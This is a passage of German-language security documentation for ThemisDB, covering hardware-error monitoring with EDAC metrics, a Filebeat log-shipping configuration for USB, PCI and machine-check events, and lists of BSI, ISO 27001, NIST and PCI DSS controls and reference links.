#!/bin/bash
edac-util -v

# In Prometheus/Grafana
node_edac_correctable_errors_total
node_edac_uncorrectable_errors_total
```

### 5. **SIEM-Integration**

```yaml
# Filebeat-Konfiguration für Hardware-Logs
filebeat.inputs:
  - type: log
    paths:
      - /var/log/syslog
      - /var/log/kern.log
    fields:
      log_type: hardware_security
    
    processors:
      - drop_event:
          when:
            not:
              or:
                - contains:
                    message: "usb"
                - contains:
                    message: "pci"
                - contains:
                    message: "EDAC"
                - contains:
                    message: "MCE"  # Machine Check Exception

output.elasticsearch:
  hosts: ["elasticsearch:9200"]
  index: "themisdb-hardware-security-%{+yyyy.MM.dd}"
```

---

## Compliance und Standards

### BSI (Bundesamt für Sicherheit in der Informationstechnik)

**Relevante BSI-Richtlinien:**
- **BSI IT-Grundschutz M 1.14**: Geeignete Aufstellung von IT-Systemen
- **BSI IT-Grundschutz M 1.15**: Verschluss von Türen und Fenstern
- **BSI IT-Grundschutz M 1.19**: Sicherung der Verkabelung
- **BSI IT-Grundschutz M 2.9**: Einsatz von USV-Anlagen
- **BSI IT-Grundschutz M 4.68**: Secure Boot

### ISO 27001 Controls

**Physische Sicherheit:**
- **A.11.1**: Sichere Bereiche
- **A.11.2**: Zutrittskontrolle

**Technische Sicherheit:**
- **A.12.2**: Schutz vor Schadsoftware
- **A.12.6**: Technische Schwachstellenmanagement

### NIST SP 800-53

**Relevante Controls:**
- **PE-3**: Physical Access Control
- **PE-5**: Access Control for Output Devices
- **PE-9**: Power Equipment and Cabling
- **SI-16**: Memory Protection

### PCI DSS 4.0

**Requirement 9**: Restrict Physical Access to Cardholder Data
- 9.1: Use appropriate facility entry controls
- 9.3: Control physical access to sensitive areas
- 9.9: Protect POS devices from tampering

---

## Siehe auch

### ThemisDB Security Documentation

- [Security Overview](security_overview.md)
- [Security Hardening Guide](security_hardening.md)
- [Threat Model](security_threat_model.md)
- [HSM Integration](security_hsm.md)
- [Key Management](security_key_management.md)
- [Encryption Strategy](security_encryption_strategy.md)
- [Incident Response](security_incident_response.md)

### Externe Ressourcen

**Hardware-Security:**
- [Intel Security Advisories](https://www.intel.com/content/www/us/en/security-center/default.html)
- [AMD Security](https://www.amd.com/en/corporate/product-security)
- [NIST Hardware Security](https://csrc.nist.gov/projects/hardware-roots-of-trust)

**Tools:**
- [CHIPSEC](https://github.com/chipsec/chipsec) - Intel Security Testing
- [USBGuard](https://usbguard.github.io/) - USB Device Authorization
- [Thunderbolt Security](https://www.kernel.org/doc/html/latest/admin-guide/thunderbolt.html)

**Vulnerability Databases:**
- [CVE Database](https://cve.mitre.org/)
- [Intel-SA (Security Advisories)](https://www.intel.com/content/www/us/en/security-center/advisory.html)
- [AMD Product Security](https://www.amd.com/en/corporate/product-security/bulletin)

---

## Änderungsverlauf

| Datum | Version | Änderung | Autor |
|-------|---------|----------|-------|
| 2026-01-07 | 1.0.0 | Initiale Dokumentation Hardware-Angriffsvektoren | ThemisDB Security Team |

---

<div align="center">

**🔒 Hardware-Sicherheit ist fundamental für ThemisDB**

[🚨 Security Policy](../../../SECURITY.md) · [📖 Security Docs](README.md) · [🛡️ Hardening Guide](security_hardening.md)

</div>
